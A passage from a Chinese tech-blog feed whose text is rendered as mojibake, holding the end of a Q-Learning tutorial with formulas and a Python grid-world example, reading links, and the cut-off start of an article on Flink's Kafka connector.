style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop">max</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">âˆ£</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"/><span class="mord mathnormal">a</span><span class="mord"><span class="delimsizing size1">]</span></span></span></span></span></span></p>
<p>å…¶ä¸­ï¼š</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span></span></span></span></span>ä¸ºå½“å‰çŠ¶æ€</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">a</span></span></span></span></span>ä¸ºå½“å‰åŠ¨ä½œ</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mtext>â€²</mtext></mrow><annotation encoding="application/x-tex">sâ€²</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5556em;"/><span class="mord mathnormal">s</span><span class="mord">â€²</span></span></span></span></span>ä¸ºä¸‹ä¸€ä¸ªçŠ¶æ€</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>R</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">R_{t+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0077em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span/></span></span></span></span></span></span></span></span></span>ä¸ºå³æ—¶å¥–åŠ±</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î³</mi></mrow><annotation encoding="application/x-tex">Î³</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05556em;">Î³</span></span></span></span></span>ä¸ºæŠ˜æ‰£å› å­</li>
</ul>
<p>é€šè¿‡ä¸æ–­æ›´æ–° Q å€¼ï¼ŒQ-Learning èƒ½æ”¶æ•›åˆ°æœ€ä¼˜ Q å‡½æ•° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>Q</mi><mo>âˆ—</mo></msup></mrow><annotation encoding="application/x-tex">Q^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8831em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span></span></span></span></span>ï¼Œä»è€Œå¯¼å‡ºæœ€ä¼˜ç­–ç•¥ï¼š</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>Ï€</mi><mo>âˆ—</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>=</mo><mi>arg</mi><mo>â¡</mo><msub><mrow><mi>max</mi><mo>â¡</mo></mrow><mi>a</mi></msub><msup><mi>Q</mi><mo>âˆ—</mo></msup><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\pi^*(s) = \arg\max_a Q^*(s,a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mop">ar<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop">max</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">âˆ—</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span></span></span></span></span></p>
<p>Q-Learning ç®—æ³•çš„æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>åˆå§‹åŒ–ï¼šå¯¹æ¯ä¸ªçŠ¶æ€-åŠ¨ä½œå¯¹<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Q(s,a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">Q</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mclose">)</span></span></span></span></span>åˆå§‹åŒ–ä¸º 0 æˆ–å°éšæœºæ•°ã€‚</li>
<li>äº¤äº’å­¦ä¹ ï¼šåœ¨æ¯ä¸ªæ—¶é—´æ­¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"/><span class="mord mathnormal">t</span></span></span></span></span>ï¼Œæ™ºèƒ½ä½“ä»çŠ¶æ€ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">s</span></span></span></span></span> é€‰æ‹©åŠ¨ä½œ aï¼ˆé€šå¸¸é‡‡ç”¨ Ïµ-è´ªå¿ƒç­–ç•¥ï¼‰ã€‚</li>
<li>æ‰§è¡ŒåŠ¨ä½œï¼šæ™ºèƒ½ä½“æ‰§è¡ŒåŠ¨ä½œ aï¼Œè§‚å¯Ÿå¥–åŠ±Rt+1 å’Œä¸‹ä¸€ä¸ªçŠ¶æ€ sâ€™ã€‚</li>
<li>æ›´æ–° Q å€¼ï¼š Q(s,a)â†Q(s,a)+Î±[Rt+1+Î³maxaâ€²Q(sâ€²,aâ€²)âˆ’Q(s,a)]å…¶ä¸­ Î±ä¸ºå­¦ä¹ ç‡ã€‚</li>
<li>è¿­ä»£ç›´åˆ°æ”¶æ•›ï¼šé‡å¤æ­¥éª¤ 2-4ï¼Œç›´è‡³ Q å€¼æ”¶æ•›æˆ–è¾¾åˆ°æœ€å¤§è¿­ä»£æ¬¡æ•°ã€‚</li>
</ol>
<p>ä¸‹é¢æˆ‘ä»¬é€šè¿‡ 4Ã—4 ç½‘æ ¼ä¸–ç•Œæ¼”ç¤º Q-Learning å­¦ä¹ æœ€ä¼˜ç­–ç•¥ï¼Œ</p>
<pre><code class="hljs language-ini" lang="ini">import numpy as np
import matplotlib.pyplot as plt

<span class="hljs-comment"># ç½‘æ ¼ä¸–ç•Œå‚æ•°</span>
n_rows, <span class="hljs-attr">n_cols</span> = <span class="hljs-number">4</span>, <span class="hljs-number">4</span>
<span class="hljs-attr">n_states</span> = n_rows * n_cols
<span class="hljs-attr">n_actions</span> = <span class="hljs-number">4</span>  <span class="hljs-comment"># ä¸Š,ä¸‹,å·¦,å³</span>
<span class="hljs-attr">action_offsets</span> = [(-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>),(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)]
<span class="hljs-attr">action_symbols</span> = [<span class="hljs-string">'â†‘'</span>,<span class="hljs-string">'â†“'</span>,<span class="hljs-string">'â†'</span>,<span class="hljs-string">'â†’'</span>]

<span class="hljs-attr">start_state</span> = <span class="hljs-number">0</span>
<span class="hljs-attr">terminal_state</span> = n_states-<span class="hljs-number">1</span>
<span class="hljs-attr">reward_step</span> = -<span class="hljs-number">1</span>
<span class="hljs-attr">reward_terminal</span> = <span class="hljs-number">0</span>

<span class="hljs-attr">gamma</span> = <span class="hljs-number">0.9</span>
<span class="hljs-attr">alpha</span> = <span class="hljs-number">0.1</span>
<span class="hljs-attr">epsilon</span> = <span class="hljs-number">0.1</span>
<span class="hljs-attr">n_episodes</span> = <span class="hljs-number">5000</span>

<span class="hljs-comment"># çŠ¶æ€è½¬ç§»</span>
def next_state_reward(s,a):
    row,<span class="hljs-attr">col</span> = divmod(s,n_cols)
    if <span class="hljs-attr">s</span>==terminal_state:
        return s,reward_terminal
    dr,<span class="hljs-attr">dc</span> = action_<span class="hljs-literal">off</span>sets[a]
    <span class="hljs-attr">new_row</span> = min(max(row+dr,<span class="hljs-number">0</span>),n_rows-<span class="hljs-number">1</span>)
    <span class="hljs-attr">new_col</span> = min(max(col+dc,<span class="hljs-number">0</span>),n_cols-<span class="hljs-number">1</span>)
    <span class="hljs-attr">s_next</span> = new_row*n_cols+new_col
    return s_next,reward_step

<span class="hljs-comment"># åˆå§‹åŒ– Q è¡¨</span>
<span class="hljs-attr">Q</span> = np.zeros((n_states,n_actions))

<span class="hljs-comment"># Q-Learning ä¸»å¾ªç¯</span>
for episode in range(n_episodes):
    <span class="hljs-attr">s</span> = start_state
    while s != terminal_state:
        <span class="hljs-comment"># epsilon-greedy é€‰æ‹©åŠ¨ä½œ</span>
        if np.random.rand() &lt; epsilon:
            <span class="hljs-attr">a</span> = np.random.randint(n_actions)
        else:
            <span class="hljs-attr">a</span> = np.argmax(Q[s])
        s_next, <span class="hljs-attr">r</span> = next_state_reward(s,a)
        Q<span class="hljs-section">[s,a]</span> += alpha*(r + gamma*np.max(Q<span class="hljs-section">[s_next]</span>) - Q<span class="hljs-section">[s]</span>)
        <span class="hljs-attr">s</span> = s_next

<span class="hljs-comment"># å¯¼å‡ºæœ€ä¼˜ç­–ç•¥</span>
<span class="hljs-attr">policy</span> = np.full(n_states,<span class="hljs-string">''</span>,dtype=object)
for s in range(n_states):
    if <span class="hljs-attr">s</span>==start_state:
        policy<span class="hljs-section">[s]</span>='S'
    elif <span class="hljs-attr">s</span>==terminal_state:
        policy<span class="hljs-section">[s]</span>='T'
    else:
        policy<span class="hljs-section">[s]</span> = action_symbols<span class="hljs-section">[np.argmax(Q[s]</span>)]

<span class="hljs-attr">grid_policy</span> = policy.reshape(n_rows,n_cols)
print("æœ€ä¼˜ç­–ç•¥ï¼š")
print(grid_policy)

<span class="hljs-comment"># å¯è§†åŒ–</span>
plt.figure(<span class="hljs-attr">figsize</span>=(<span class="hljs-number">6</span>,<span class="hljs-number">6</span>))
plt.imshow(np.max(Q,<span class="hljs-attr">axis</span>=<span class="hljs-number">1</span>).reshape(n_rows,n_cols), cmap=<span class="hljs-string">'cool'</span>, interpolation=<span class="hljs-string">'nearest'</span>)
for i in range(n_rows):
    for j in range(n_cols):
        plt.text(j,i,f"{grid_policy<span class="hljs-section">[i*n_cols+j]</span>}",<span class="hljs-attr">ha</span>=<span class="hljs-string">'center'</span>,va=<span class="hljs-string">'center'</span>,color=<span class="hljs-string">'black'</span>)
plt.title("Grid World: Optimal Policy via Q-Learning")
plt.colorbar(<span class="hljs-attr">label</span>=<span class="hljs-string">"Max Q-Value"</span>)
plt.show()
</code></pre>
<p>ç»“æœå¦‚ä¸‹å›¾ï¼ŒåŒæ ·ï¼Œèµ·ç‚¹ S åˆ°ç»ˆç‚¹ T çš„è·¯å¾„ç”±ç­–ç•¥æŒ‡ç¤ºï¼Œæ–¹å‘ç®­å¤´æŒ‡æ˜æ™ºèƒ½ä½“åº”è¯¥é‡‡å–çš„åŠ¨ä½œï¼Œé¢œè‰²æ·±è¡¨ç¤ºè¯¥çŠ¶æ€ä¸‹æœ€å¤§ Q å€¼è¾ƒé«˜ï¼Œè¯´æ˜é è¿‘ç»ˆç‚¹æˆ–é€šå¾€ç»ˆç‚¹çš„åŠ¨ä½œæ›´ä¼˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c83f93ead29a4d9b855fedd264ffa756~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769529615&amp;x-signature=hCGl0yc4lLPO%2BIANO%2FPTb4qTUXk%3D" alt="" loading="lazy"/></p>
<p>æ·»åŠ å›¾ç‰‡æ³¨é‡Šï¼Œä¸è¶…è¿‡ 140 å­—ï¼ˆå¯é€‰ï¼‰</p>
<p>ç®€å•æ€»ç»“ä¸€ä¸‹ï¼ŒQ-Learning æ˜¯å¼ºåŒ–å­¦ä¹ ä¸­åŸºç¡€è€Œé‡è¦çš„ç®—æ³•ï¼Œé€šè¿‡ä¸æ–­æ›´æ–°çŠ¶æ€-åŠ¨ä½œä»·å€¼å‡½æ•°ï¼Œæ™ºèƒ½ä½“å¯ä»¥åœ¨æœªçŸ¥ç¯å¢ƒä¸­å­¦ä¹ æœ€ä¼˜ç­–ç•¥ã€‚å…¶ä¼˜ç‚¹æ˜¯æ— æ¨¡å‹ã€ç®€å•æ˜“å®ç°ã€æ”¶æ•›æ€§è‰¯å¥½ï¼Œç¼ºç‚¹æ˜¯çŠ¶æ€ç©ºé—´å’ŒåŠ¨ä½œç©ºé—´è¿‡å¤§æ—¶éœ€è¦é‡‡ç”¨å‡½æ•°é€¼è¿‘ï¼ˆå¦‚æ·±åº¦ Q ç½‘ç»œï¼‰ã€‚</p>
<p>æœ€æ–°çš„æ–‡ç« éƒ½åœ¨å…¬ä¼—å·aicotingæ›´æ–°ï¼Œåˆ«å¿˜è®°å…³æ³¨å“¦ï¼ï¼ï¼</p>
<p>ğŸ“š æ¨èé˜…è¯»</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485782%26idx%3D1%26sn%3D060c8222b47cbf903fbfded1f0421bcf%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485782&amp;idx=1&amp;sn=060c8222b47cbf903fbfded1f0421bcf&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ä¹‹æ•°æ®é¢„å¤„ç†ç¯‡ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485800%26idx%3D1%26sn%3Da52107c9dc7071d8530a24563861fa46%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485800&amp;idx=1&amp;sn=a52107c9dc7071d8530a24563861fa46&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ç‰¹å¾å·¥ç¨‹ä¸­çš„ç‰¹å¾é€‰æ‹©</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485808%26idx%3D1%26sn%3D2c57081d4b12433f6b8919209e2e52ed%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485808&amp;idx=1&amp;sn=2c57081d4b12433f6b8919209e2e52ed&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ä¸­çš„ç‰¹å¾æ„é€ </a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485820%26idx%3D1%26sn%3Dadcb41fd14347f2f1431709323fa253f%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485820&amp;idx=1&amp;sn=adcb41fd14347f2f1431709323fa253f&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ä¹‹ç‰¹å¾é™ç»´</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485941%26idx%3D1%26sn%3Dcb53a98bacd1cfbd3255bbeeab6a24ec%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485941&amp;idx=1&amp;sn=cb53a98bacd1cfbd3255bbeeab6a24ec&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚å±‚æ¬¡èšç±»å’Œå¯†åº¦èšç±»æ–¹æ³•ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485946%26idx%3D1%26sn%3Da5cf50a4a3bda9785fb0c7baae3a6bb2%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485946&amp;idx=1&amp;sn=a5cf50a4a3bda9785fb0c7baae3a6bb2&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„PCAä¸»æˆåˆ†åˆ†æï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485952%26idx%3D1%26sn%3Dffe1fca4cb75b2f99ace92593554837c%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485952&amp;idx=1&amp;sn=ffe1fca4cb75b2f99ace92593554837c&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">æœºå™¨å­¦ä¹ ä¸­ç‹¬ç«‹æˆåˆ†åˆ†æICAå’Œä¸»æˆåˆ†åˆ†æPCAæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485960%26idx%3D1%26sn%3D05cf98957ea11dcd6ae165588b4c91c7%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485960&amp;idx=1&amp;sn=05cf98957ea11dcd6ae165588b4c91c7&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ä¸€æ–‡ææ‡‚t-SNEå’ŒUMAPé™ç»´æ–¹æ³•ï¼</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485972%26idx%3D1%26sn%3De106fcda9b02b7e8a6fb31495bb28dae%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485972&amp;idx=1&amp;sn=e106fcda9b02b7e8a6fb31495bb28dae&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ä¸‡å­—é•¿æ–‡ï¼ææ‡‚æœºå™¨å­¦ä¹ ä¸­çš„æ¦‚ç‡å›¾æ¨¡å‹</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485986%26idx%3D1%26sn%3D9057c13995012cc7220eae20f6cfb4c2%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485986&amp;idx=1&amp;sn=9057c13995012cc7220eae20f6cfb4c2&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ä¸‡å­—é•¿æ–‡ï¼ææ‡‚æœºå™¨å­¦ä¹ ä¸­åŠç›‘ç£å­¦ä¹ çš„ç»å…¸æ–¹æ³•ï¼</a></p>
<p>ä½œè€…ï¼šaicoting</p>
<p>åˆ†äº«æ˜¯ä¸€ç§ä¿¡ä»°ï¼Œè¿æ¥è®©æˆé•¿æ›´æœ‰æ¸©åº¦ã€‚</p>
<p>æˆ‘ä»¬ä¸‹æ¬¡ä¸è§ä¸æ•£ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flinkæºç é˜…è¯»ï¼šKafka Connector]]></title>    <link>https://juejin.cn/post/7597125475602317339</link>    <guid>https://juejin.cn/post/7597125475602317339</guid>    <pubDate>2026-01-20T14:05:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597125475602317339" data-draft-id="7597125475602300955" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flinkæºç é˜…è¯»ï¼šKafka Connector"/> <meta itemprop="keywords" content="Flink,å¤§æ•°æ®"/> <meta itemprop="datePublished" content="2026-01-20T14:05:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¢å‘Googleç¼–ç¨‹"/> <meta itemprop="url" content="https://juejin.cn/user/1063982986695374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flinkæºç é˜…è¯»ï¼šKafka Connector
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1063982986695374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¢å‘Googleç¼–ç¨‹
